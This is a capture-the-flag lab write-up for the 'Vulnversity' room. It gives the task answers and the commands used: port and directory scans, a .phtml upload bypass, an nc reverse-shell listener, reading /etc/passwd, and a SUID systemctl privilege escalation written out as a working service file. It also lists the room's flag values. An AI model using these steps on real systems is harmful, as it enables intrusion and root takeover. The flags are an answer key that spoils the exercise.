# Vulnversity

### TASK 1 
DEPLOY MACHINE
IP: 10.10.82.47

### TASK 2 

1. Scan the box, how many ports are open?
 - 6
 > nmap -sC -sV -oN nmap/initial 10.10.82.47

2. What version of the squid proxy is running on the machine?
 - 3.5.12

3. How many ports will nmap scan if the flag -p-400 was used?
 - 400

4. Using the nmap flag -n what will it not resolve?
 - DNS

5. What is the most likely operating system this machine is running?
 - Ubuntu

6. What port is the web server running on?
 - 3333

### TASK 3 - Locating Directories with GoBuster

1. What is the directory that has an upload form page?
 - /internal/
 > gobuster dir -u http://10.10.82.47:3333 -w /usr/share/wordlists dirb/common.txt -o gobuster/initial

### TASK 4 - Compromise the Webserver

1. Try upload a few file types to the server, what common extension seems to be blocked?
 - .php

2. Run this attack, what extension is allowed?
 - .phtml

Listening for reverse-shell
>nc -lvnp 4444

Stabilize Shell
> python -c "import pty; pty.spawn('/bin/bash')"
> ctrl-z (background shell)
> stty raw -echo
> press enter
> fg (to re-foreground original shell)
> press enter couple times
> export TERM=xterm

3. What is the name of the user who manages the webserver?
Bill

> cat /etc/passwd

4. What is the user flag?
8bd7992fbe8a6ad22a63361004cfcedb

> cd /home/bill
> cat user.txt

### TASK 5 - Privilage Escalation

1. On the system, search for all SUID files. What file stands out?
/bin/systemctl

> find / -perm -4000 2>/dev/null
    > NOTE: 2>/dev/null - this redirects std error to null

2. Become root and get the last flag (/root/root.txt)
a58ff8579f0a9270368d33a9966c7fd5

> GTFObins (modified the "chmod +s /bin/bash" as that will privesc on bash)

> TF=$(mktemp).service
  echo '[Service]
  Type=oneshot
  ExecStart=/bin/sh -c "chmod +s /bin/bash"
  [Install]
  WantedBy=multi-user.target' > $TF
  /bin/systemctl link $TF
  /bin/systemctl enable --now $TF

> /bin/bash -p (this runs bash with current privilages)
> cd /root
> cat root.txt
